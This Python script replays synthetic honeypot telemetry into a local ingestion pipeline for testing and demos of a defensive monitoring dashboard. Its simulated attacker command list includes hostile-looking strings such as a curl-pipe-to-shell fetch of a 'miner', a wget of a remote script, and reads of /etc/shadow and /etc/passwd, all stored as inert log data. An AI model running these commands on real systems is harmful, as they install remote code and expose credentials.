#!/usr/bin/env python3
"""
Replay synthetic honeypot telemetry into the local ingestion pipeline.

This is a fallback for UI work, automated tests and presentations where the
live sensors are unavailable. It is NOT the production path — real demos
should drive the actual honeypots from the second machine (see
scripts/attack_scenarios.sh).

The important property: replay appends to the same sensor log files the real
sensors write, so events travel the identical route —

    replay -> telemetry/raw/<sensor>/*.json
           -> collector (tail + cursor)
           -> normalizer
           -> database
           -> SSE -> dashboard

Nothing is injected past the collector, so a replay exercises the parsers, the
deduplication and the storage layer exactly as live traffic would.

Usage
-----
    python scripts/replay_telemetry.py --sensor cowrie --rate 2 --seed 42
    python scripts/replay_telemetry.py --scenario brute-force --sensor cowrie
    python scripts/replay_telemetry.py --all-sensors --count 60 --rate 5

Determinism
-----------
With --seed, the generated IPs, usernames, passwords and command sequences are
identical across runs, so a demo or a test can assert on exact content. The
timestamps still advance in real time unless --start-time is given.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, Iterator, List

# Default telemetry root; matches TELEMETRY_DIR in docker-compose.yml.
DEFAULT_TELEMETRY_DIR = Path(__file__).resolve().parents[1] / "telemetry" / "raw"

SENSORS = ("cowrie", "dionaea", "honeytrap")

# Log filename per sensor — same names the real sensors use, so replay and
# live data are indistinguishable to the collector.
SENSOR_LOGFILES = {
    "cowrie": "cowrie.json",
    "dionaea": "dionaea.json",
    "honeytrap": "honeytrap.json",
}

# Source addresses for synthetic attackers. RFC 5737 documentation ranges plus
# a private range, so replayed data can never be confused with a real host.
ATTACKER_IPS = [
    "192.0.2.10", "192.0.2.44", "198.51.100.7",
    "198.51.100.23", "203.0.113.5", "203.0.113.99",
    "192.168.64.12",
]

USERNAMES = ["root", "admin", "oracle", "ubuntu", "test", "postgres", "git", "pi"]

PASSWORDS = [
    "123456", "password", "admin", "root", "toor", "qwerty",
    "letmein", "1234", "changeme", "P@ssw0rd",
]

# Commands an attacker typically runs immediately after landing on a box:
# identify the host, look for credentials, check what else is reachable.
POST_LOGIN_COMMANDS = [
    "whoami",
    "uname -a",
    "id",
    "pwd",
    "ls -la",
    "cat /etc/passwd",
    "cat /proc/cpuinfo",
    "ps aux",
    "netstat -antp",
    "wget http://192.0.2.200/x.sh",
    "curl -s http://192.0.2.200/miner | sh",
    "cat /etc/shadow",
    "history",
    "crontab -l",
]

DIONAEA_PORTS = [445, 1433, 21, 3306, 5060]
HONEYTRAP_PORTS = [8022, 8023]


def _iso(dt: datetime) -> str:
    """Cowrie-style ISO timestamp with a Z suffix."""
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


# ── Per-sensor event generators ─────────────────────────────────────────────


def cowrie_session(rng: random.Random, now: datetime, succeed: bool = None) -> List[Dict]:
    """
    One complete Cowrie SSH session.

    Produces the real event sequence: connect, one or more auth attempts, then
    (on success) a command sequence and a clean close. Matching the real shape
    matters — the dashboard's timeline and the severity rules key off these
    exact eventids.
    """
    src_ip = rng.choice(ATTACKER_IPS)
    src_port = rng.randint(30000, 65000)
    session = uuid.UUID(int=rng.getrandbits(128)).hex[:12]
    username = rng.choice(USERNAMES)

    if succeed is None:
        succeed = rng.random() < 0.35

    events: List[Dict] = []
    t = now

    def base(eventid: str, **extra) -> Dict:
        return {
            "eventid": eventid,
            "timestamp": _iso(t),
            "session": session,
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": "10.0.0.5",
            "dst_port": 2222,
            "sensor": "cowrie",
            "protocol": "ssh",
            **extra,
        }

    events.append(base(
        "cowrie.session.connect",
        message=f"New connection: {src_ip}:{src_port}",
    ))
    t += timedelta(milliseconds=rng.randint(200, 900))

    # A few failures before the success, which is what brute force looks like.
    failures = rng.randint(0, 3) if succeed else rng.randint(1, 5)
    for _ in range(failures):
        events.append(base(
            "cowrie.login.failed",
            username=username,
            password=rng.choice(PASSWORDS),
            message="login attempt failed",
        ))
        t += timedelta(milliseconds=rng.randint(300, 1500))

    if succeed:
        events.append(base(
            "cowrie.login.success",
            username=username,
            password=rng.choice(PASSWORDS),
            message="login attempt succeeded",
        ))
        t += timedelta(milliseconds=rng.randint(500, 1200))

        for command in rng.sample(POST_LOGIN_COMMANDS, rng.randint(3, 7)):
            events.append(base("cowrie.command.input", input=command, message=f"CMD: {command}"))
            t += timedelta(milliseconds=rng.randint(700, 2500))

        # Occasionally pull a payload — the CRITICAL severity path.
        if rng.random() < 0.3:
            events.append(base(
                "cowrie.session.file_download",
                url="http://192.0.2.200/payload.bin",
                shasum=uuid.UUID(int=rng.getrandbits(128)).hex,
                outfile="var/lib/cowrie/downloads/payload.bin",
            ))
            t += timedelta(milliseconds=rng.randint(400, 900))

    events.append(base("cowrie.session.closed", duration=round(rng.uniform(2.0, 90.0), 2)))
    return events


def dionaea_events(rng: random.Random, now: datetime) -> List[Dict]:
    """A Dionaea connection record — SMB/MSSQL/FTP probe."""
    src_ip = rng.choice(ATTACKER_IPS)
    port = rng.choice(DIONAEA_PORTS)
    return [{
        "timestamp": _iso(now),
        "eventid": "dionaea.connection.tcp.accept",
        "sensor": "dionaea",
        "connection": {
            "protocol": {445: "smbd", 1433: "mssqld", 21: "ftpd",
                         3306: "mysqld", 5060: "sipd"}[port],
            "transport": "tcp",
            "remote": {"host": src_ip, "port": rng.randint(30000, 65000)},
            "local": {"host": "10.0.0.5", "port": port},
        },
    }]


def honeytrap_events(rng: random.Random, now: datetime) -> List[Dict]:
    """A Honeytrap probe on one of its emulated ports."""
    src_ip = rng.choice(ATTACKER_IPS)
    port = rng.choice(HONEYTRAP_PORTS)
    return [{
        "date": _iso(now),
        "type": "http-request" if port == 8022 else "ssh-connect",
        "category": "http" if port == 8022 else "ssh",
        "sensor": "honeytrap",
        "source-ip": src_ip,
        "source-port": rng.randint(30000, 65000),
        "destination-ip": "10.0.0.5",
        "destination-port": port,
        "agent": rng.choice(["curl/8.4.0", "Mozilla/5.0", "python-requests/2.31.0", "Nmap NSE"]),
    }]


GENERATORS = {
    "cowrie": cowrie_session,
    "dionaea": dionaea_events,
    "honeytrap": honeytrap_events,
}


# ── Named scenarios ─────────────────────────────────────────────────────────


def scenario_brute_force(rng: random.Random, now: datetime) -> List[Dict]:
    """Sustained failed logins from one host — no success."""
    events: List[Dict] = []
    src_ip = rng.choice(ATTACKER_IPS)
    t = now
    session = uuid.UUID(int=rng.getrandbits(128)).hex[:12]

    for _ in range(rng.randint(12, 25)):
        events.append({
            "eventid": "cowrie.login.failed",
            "timestamp": _iso(t),
            "session": session,
            "src_ip": src_ip,
            "src_port": rng.randint(30000, 65000),
            "dst_port": 2222,
            "sensor": "cowrie",
            "protocol": "ssh",
            "username": rng.choice(USERNAMES),
            "password": rng.choice(PASSWORDS),
        })
        t += timedelta(milliseconds=rng.randint(120, 600))
    return events


def scenario_successful_session(rng: random.Random, now: datetime) -> List[Dict]:
    """A login that succeeds, followed by hands-on-keyboard commands."""
    return cowrie_session(rng, now, succeed=True)


def scenario_port_scan(rng: random.Random, now: datetime) -> List[Dict]:
    """One host touching many ports in quick succession."""
    events: List[Dict] = []
    src_ip = rng.choice(ATTACKER_IPS)
    t = now
    for port in [21, 22, 23, 80, 445, 1433, 3306, 3389, 5060, 8022, 8023]:
        events.append({
            "timestamp": _iso(t),
            "eventid": "dionaea.connection.tcp.reject",
            "sensor": "dionaea",
            "connection": {
                "protocol": "pcap", "transport": "tcp",
                "remote": {"host": src_ip, "port": rng.randint(30000, 65000)},
                "local": {"host": "10.0.0.5", "port": port},
            },
        })
        t += timedelta(milliseconds=rng.randint(30, 150))
    return events


SCENARIOS = {
    "brute-force": (scenario_brute_force, "cowrie"),
    "successful-session": (scenario_successful_session, "cowrie"),
    "port-scan": (scenario_port_scan, "dionaea"),
}


# ── Writing ─────────────────────────────────────────────────────────────────


def append_events(telemetry_dir: Path, sensor: str, events: List[Dict]) -> Path:
    """
    Append events to the sensor's log file as newline-delimited JSON.

    Opened in append mode and flushed per batch so the collector — which tails
    from a byte offset — sees complete lines promptly. Writing a whole file at
    once would work too, but appending is what a real sensor does, so this
    exercises the cursor logic properly.
    """
    target_dir = telemetry_dir / sensor
    target_dir.mkdir(parents=True, exist_ok=True)
    path = target_dir / SENSOR_LOGFILES[sensor]

    with open(path, "a", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event) + "\n")
        handle.flush()
        os.fsync(handle.fileno())

    return path


def generate(
    sensor: str,
    count: int,
    rng: random.Random,
    start_time: datetime,
) -> Iterator[List[Dict]]:
    """Yield successive event batches for a sensor."""
    generator = GENERATORS[sensor]
    for index in range(count):
        yield generator(rng, start_time + timedelta(seconds=index))


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Replay synthetic honeypot telemetry through the real ingestion pipeline.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--sensor", choices=SENSORS, default="cowrie",
        help="Which sensor's format to emit (default: cowrie).",
    )
    parser.add_argument(
        "--all-sensors", action="store_true",
        help="Emit for every sensor in rotation instead of just one.",
    )
    parser.add_argument(
        "--scenario", choices=sorted(SCENARIOS),
        help="Emit one named scenario instead of random activity.",
    )
    parser.add_argument(
        "--count", type=int, default=10,
        help="Number of batches to emit (default: 10). A Cowrie batch is a whole session.",
    )
    parser.add_argument(
        "--rate", type=float, default=1.0,
        help="Batches per second (default: 1.0). Use 0 to write everything at once.",
    )
    parser.add_argument(
        "--seed", type=int,
        help="RNG seed. With a seed, output is byte-identical across runs.",
    )
    parser.add_argument(
        "--telemetry-dir", type=Path, default=DEFAULT_TELEMETRY_DIR,
        help=f"Telemetry root (default: {DEFAULT_TELEMETRY_DIR}).",
    )
    parser.add_argument(
        "--start-time", type=str,
        help="ISO timestamp for the first event. Defaults to now. "
             "Set it for fully deterministic output including timestamps.",
    )
    args = parser.parse_args()

    rng = random.Random(args.seed)

    if args.start_time:
        try:
            start = datetime.fromisoformat(args.start_time.replace("Z", "+00:00"))
        except ValueError:
            print(f"error: --start-time is not a valid ISO timestamp: {args.start_time}",
                  file=sys.stderr)
            return 2
    else:
        start = datetime.now(timezone.utc)

    if args.scenario:
        generator, sensor = SCENARIOS[args.scenario]
        events = generator(rng, start)
        path = append_events(args.telemetry_dir, sensor, events)
        print(f"scenario '{args.scenario}': wrote {len(events)} event(s) -> {path}")
        return 0

    sensors = list(SENSORS) if args.all_sensors else [args.sensor]
    total = 0
    delay = (1.0 / args.rate) if args.rate > 0 else 0.0

    print(
        f"Replaying {args.count} batch(es) across {', '.join(sensors)} "
        f"at {args.rate}/s into {args.telemetry_dir}"
        + (f" (seed={args.seed})" if args.seed is not None else "")
    )

    try:
        for index in range(args.count):
            sensor = sensors[index % len(sensors)]
            events = GENERATORS[sensor](rng, start + timedelta(seconds=index))
            append_events(args.telemetry_dir, sensor, events)
            total += len(events)
            print(f"  [{index + 1}/{args.count}] {sensor}: +{len(events)} event(s)")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\ninterrupted")

    print(f"Done. {total} event(s) written. The collector will ingest them within a few seconds.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
